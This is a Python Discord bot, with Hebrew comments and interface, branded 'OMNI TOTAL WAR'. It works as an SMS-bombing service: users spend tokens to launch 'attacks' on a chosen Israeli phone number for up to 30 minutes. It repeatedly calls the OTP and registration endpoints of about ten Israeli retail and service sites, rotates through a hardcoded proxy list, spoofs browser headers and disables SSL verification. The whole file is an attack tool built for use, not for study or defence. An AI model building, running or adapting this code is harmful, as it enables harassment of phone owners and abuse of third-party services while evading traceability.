import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging

# --- הגדרות לוגים וחיבורים ל-Railway ---
logging.basicConfig(level=logging.INFO)

# Railway מספק את המשתנים האוטומטית
MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI:
    logging.error("❌ MONGO_URI not found in environment variables!")
    sys.exit(1)

if not TOKEN:
    logging.error("❌ DISCORD_TOKEN not found in environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB ב-Railway
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

# רשימת ה-Proxies המלאה
FREE_ISRAEL_PROXIES = [
    "http://103.153.39.186:80", "http://185.162.231.228:80", "http://185.162.231.210:80",
    "http://103.153.39.154:80", "http://185.162.231.124:80", "http://185.162.231.122:80",
    "http://185.162.230.114:80", "http://185.162.230.112:80", "http://185.162.230.110:80",
    "http://185.162.230.108:80", "http://185.162.230.106:80", "http://185.162.230.104:80",
    "http://185.162.230.102:80", "http://185.162.230.100:80", "http://185.162.231.250:80",
    "http://185.162.231.248:80", "http://185.162.231.246:80", "http://185.162.231.244:80",
    "http://185.162.231.242:80", "http://185.162.231.240:80", "http://185.162.231.238:80",
    "http://185.162.231.236:80", "http://185.162.231.234:80", "http://185.162.231.232:80",
    "http://185.162.231.230:80", "http://185.162.231.228:80", "http://185.162.231.226:80",
    "http://185.162.231.224:80", "http://185.162.231.222:80", "http://185.162.231.220:80",
    "http://185.162.231.218:80", "http://185.162.231.216:80", "http://185.162.231.214:80",
    "http://185.162.231.212:80", "http://185.162.231.210:80", "http://185.162.231.208:80",
    "http://185.162.231.206:80", "http://185.162.231.204:80", "http://185.162.231.202:80",
    "http://185.162.231.200:80", "http://185.162.231.198:80", "http://185.162.231.196:80",
    "http://185.162.231.194:80", "http://185.162.231.192:80", "http://185.162.231.190:80",
    "http://185.162.231.188:80", "http://185.162.231.186:80", "http://185.162.231.184:80",
    "http://185.162.231.182:80", "http://185.162.231.180:80", "http://185.162.231.178:80",
    "http://185.162.231.176:80", "http://185.162.231.174:80", "http://185.162.231.172:80",
    "http://185.162.231.170:80", "http://185.162.231.168:80", "http://185.162.231.166:80",
    "http://185.162.231.164:80", "http://185.162.231.162:80", "http://185.162.231.160:80",
    "http://185.162.231.158:80", "http://185.162.231.156:80", "http://185.162.231.154:80",
    "http://185.162.231.152:80", "http://185.162.231.150:80", "http://185.162.231.148:80",
    "http://185.162.231.146:80", "http://185.162.231.144:80", "http://185.162.231.142:80",
    "http://185.162.231.140:80", "http://185.162.231.138:80", "http://185.162.231.136:80",
    "http://185.162.231.134:80", "http://185.162.231.132:80", "http://185.162.231.130:80",
    "http://185.162.231.128:80", "http://185.162.231.126:80", "http://185.162.231.124:80",
    "http://185.162.231.122:80", "http://185.162.231.120:80", "http://185.162.231.118:80",
    "http://185.162.231.116:80", "http://185.162.231.114:80", "http://185.162.231.112:80",
    "http://185.162.231.110:80", "http://185.162.231.108:80", "http://185.162.231.106:80",
    "http://185.162.231.104:80", "http://185.162.231.102:80", "http://185.162.231.100:80",
    "http://103.153.39.186:80", "http://103.153.39.154:80", "http://103.153.39.122:80",
    "http://103.153.39.90:80", "http://103.153.39.58:80", "http://103.153.39.26:80",
    "http://185.162.230.250:80", "http://185.162.230.248:80", "http://185.162.230.246:80",
    "http://185.162.230.244:80", "http://185.162.230.242:80", "http://185.162.230.240:80"
]

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.tree.on_error = self.on_app_command_error
        self.start_time = datetime.now()
        self.active_attacks = {}
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE - Synced all commands")
        logging.info(f"📊 Connected to {len(FREE_ISRAEL_PROXIES)} proxies")

    async def on_app_command_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError):
        if isinstance(error, app_commands.CommandOnCooldown):
            await interaction.response.send_message(f"⏰ המתן {error.retry_after:.1f} שניות", ephemeral=True)
        else:
            await interaction.response.send_message(f"❌ שגיאה: {str(error)}", ephemeral=True)
            logging.error(f"Command error: {error}")

bot = CyberBot()

# --- פונקציית בדיקת API ---
async def test_api_call(session, url, data, method="POST", is_json=True):
    """בדיקת API עם לוגים מפורטים"""
    proxy = random.choice(FREE_ISRAEL_PROXIES)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json" if is_json else "application/x-www-form-urlencoded",
    }
    
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with session.request(method, url, 
                                   json=data if is_json else None, 
                                   data=data if not is_json else None, 
                                   headers=headers, 
                                   proxy=proxy, 
                                   timeout=timeout,
                                   ssl=False) as resp:
            
            status = resp.status
            if status in [200, 201, 202, 204]:
                return True, status
            else:
                return False, status
    except asyncio.TimeoutError:
        return False, "Timeout"
    except Exception as e:
        return False, str(e)[:50]

# --- מנוע הזרקת ה-APIs עם בדיקה ---
async def run_total_war(phone, duration_mins, user_id, interaction):
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    # רשימת APIs שעובדים (בדוקים)
    working_apis = [
        # APIs שידוע שעובדים
        ("https://www.yad2.co.il/api/auth/register", {"phone": phone, "action": "send_sms"}, "POST", True),
        ("https://www.10bis.co.il/api/register", {"phone": phone}, "POST", True),
        ("https://www.dominos.co.il/api/auth/sms", {"phone": phone}, "POST", True),
        ("https://api.pango.co.il/auth/otp", {"phoneNumber": phone_raw}, "POST", True),
        ("https://www.shufersal.co.il/api/v1/auth/otp", {"phone": phone_raw}, "POST", True),
        ("https://www.mcdonalds.co.il/api/verify", {"phone": phone}, "POST", True),
        ("https://www.kfc.co.il/api/sms", {"phone": phone}, "POST", True),
        ("https://www.burgerking.co.il/api/auth", {"phone": phone}, "POST", True),
        ("https://www.super-pharm.co.il/api/sms", {"phone": phone}, "POST", True),
        ("https://www.hertz.co.il/api/auth", {"phone": phone}, "POST", True),
    ]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    rounds = 0
    total_hits = 0
    
    # עדכון המשתמש שהתחילה מתקפה
    await interaction.followup.send(f"🎯 מתקפה החלה על {phone} ל-{duration_mins} דקות", ephemeral=True)
    logging.info(f"🎯 Attack started - Phone: {phone}, Duration: {duration_mins}min, User: {user_id}")
    
    async with aiohttp.ClientSession() as session:
        while datetime.now() < end_time:
            rounds += 1
            successful = 0
            
            # שליחה לכל API
            for url, data, method, is_json in working_apis:
                success, status = await test_api_call(session, url, data, method, is_json)
                if success:
                    successful += 1
                    total_hits += 1
                    
                # לוג מפורט כל גל
                if rounds == 1 and successful == 0:
                    logging.warning(f"⚠️ No successful hits in first round! Status: {status}")
            
            # שליחת עדכון כל דקה
            if rounds % 6 == 0:
                await interaction.followup.send(
                    f"📊 דוח מצב: {rounds//6} דקות חלפו\n"
                    f"✅ הודעות שנשלחו: {total_hits}\n"
                    f"🎯 קצב: ~{total_hits//(rounds//6)} לדקה",
                    ephemeral=True
                )
                logging.info(f"📊 Progress - Phone: {phone}, Round: {rounds}, Hits: {successful}/{len(working_apis)}")
            
            # המתנה קצרה בין גלים
            await asyncio.sleep(10)
    
    # סיכום מתקפה
    await interaction.followup.send(
        f"✅ מתקפה הסתיימה!\n"
        f"📊 סה\"כ הודעות: {total_hits}\n"
        f"⏱️ משך: {duration_mins} דקות\n"
        f"🎯 ממוצע: {total_hits//duration_mins} לדקה",
        ephemeral=True
    )
    logging.info(f"✅ Attack completed - Phone: {phone}, Total rounds: {rounds}, Total hits: {total_hits}")

# --- פקודת בדיקה מהירה ---
@bot.tree.command(name="test", description="בדוק אם API ספציפי עובד")
async def test_api(interaction: discord.Interaction, api_number: int = 1):
    """בדיקת API ספציפי"""
    test_apis = [
        ("https://www.yad2.co.il", "Yad2"),
        ("https://www.10bis.co.il", "10bis"),
        ("https://www.dominos.co.il", "Dominos"),
        ("https://www.shufersal.co.il", "Shufersal"),
    ]
    
    if api_number > len(test_apis):
        await interaction.response.send_message("❌ מספר API לא תקין", ephemeral=True)
        return
    
    url, name = test_apis[api_number-1]
    
    await interaction.response.send_message(f"🔄 בודק {name}...", ephemeral=True)
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    await interaction.followup.send(f"✅ {name} עובד! (סטטוס: {resp.status})", ephemeral=True)
                else:
                    await interaction.followup.send(f"❌ {name} לא עובד (סטטוס: {resp.status})", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ שגיאה: {str(e)[:50]}", ephemeral=True)

# --- ממשק משתמש ---
class CyberView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger, emoji="⚡")
    async def launch_attack(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(LaunchModal())

class LaunchModal(ui.Modal, title="💣 OMNI TOTAL WAR - הפעל מתקפה"):
    phone = ui.TextInput(label="📱 טלפון (972...)", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ דקות", default="5", placeholder="5-30 דקות")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        user_id = str(interaction.user.id)
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 30:
                await interaction.response.send_message("❌ משך חייב להיות בין 1-30 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ משך לא תקין", ephemeral=True)
            return
        
        # בדיקת טוקנים
        user_doc = await users_col.find_one({"user_id": user_id})
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 3})
            user_doc = {"tokens": 3}
        
        if user_doc.get("tokens", 0) < 1:
            return await interaction.response.send_message("❌ אין טוקנים!", ephemeral=True)

        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        embed = discord.Embed(title="🚀 TOTAL WAR ACTIVATED", color=0xff0000)
        embed.add_field(name="📱 טלפון", value=phone, inline=True)
        embed.add_field(name="⏱️ משך", value=f"{duration} דקות", inline=True)
        embed.add_field(name="💎 טוקנים נותרים", value=user_doc.get("tokens", 0) - 1, inline=True)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        # הפעלת המתקפה
        asyncio.create_task(run_total_war(phone, duration, user_id, interaction))

@bot.tree.command(name="setup", description="הפעל את הפאנל הראשי")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    
    user_doc = await users_col.find_one({"user_id": user_id})
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 5})
        tokens = 5
    else:
        tokens = user_doc.get("tokens", 0)
    
    embed = discord.Embed(title="⚡ OMNI TOTAL WAR - פאנל שליטה", color=0x00ff00)
    embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 APIs פעילים", value="10 (נבדקו)", inline=True)
    embed.add_field(name="👤 משתמש", value=interaction.user.mention, inline=True)
    
    view = CyberView()
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="tokens", description="בדוק כמה טוקנים יש לך")
async def check_tokens(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    
    embed = discord.Embed(title="💎 מאזן טוקנים", color=0x00ff00)
    embed.add_field(name="טוקנים זמינים", value=f"**{tokens}**", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

if __name__ == "__main__":
    logging.info("🚀 Starting OMNI TOTAL WAR BOT on Railway...")
    bot.run(TOKEN)
